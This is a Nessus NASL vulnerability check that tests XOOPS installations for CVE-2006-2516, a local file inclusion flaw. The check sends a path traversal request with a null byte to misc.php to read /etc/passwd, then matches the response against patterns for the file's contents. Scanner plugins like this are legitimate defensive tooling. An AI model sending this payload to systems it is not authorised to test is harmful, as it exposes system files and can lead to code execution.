#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21581);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-2516");
  script_bugtraq_id(18061);
  script_osvdb_id(25683);

  script_name(english:"XOOPS xoopsConfig Parameter Variable Overwrite Local File Inclusion");
  script_summary(english:"Tries to read a local file using XOOPS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is vulnerable to
local file include attacks." );
 script_set_attribute(attribute:"description", value:
"The version of XOOPS installed on the remote host allows an
unauthenticated attacker to skip processing of the application's
'include/common.php' script and thereby to gain control of the
variables '$xoopsConfig[language]' and '$xoopsConfig[theme_set]',
which are used by various scripts to include PHP code from other
files.  Successful exploitation of these issues requires that PHP's
'register_globals' setting be enabled and can be used to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434698/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/23");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/21");
 script_cvs_date("$Date: 2011/03/14 21:48:16 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (matches)
{
  dir = matches[2];

  # Try to exploit one of the flaws to read a file.
  file = "../../../../../../../../../../../etc/passwd%00";
  u = string(
      dir, "/misc.php?",
      "xoopsOption[nocommon]=1&",
      "xoopsConfig[language]=", file
    );
  r = http_send_recv3(port: port, method: "GET", item: u);
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string: r[2]) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(.+/etc/passwd\\0/misc\.php.+ failed to open stream", string: r[2]) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file or directory", string: r[2]) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.*/etc/passwd", string: r[2])
  )
  {
    if (egrep(string: r[2], pattern:"root:.*:0:[01]:"))
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        r[2]
      );
    else report = desc;

    security_warning(port:port, extra: report);
    exit(0);
  }
}
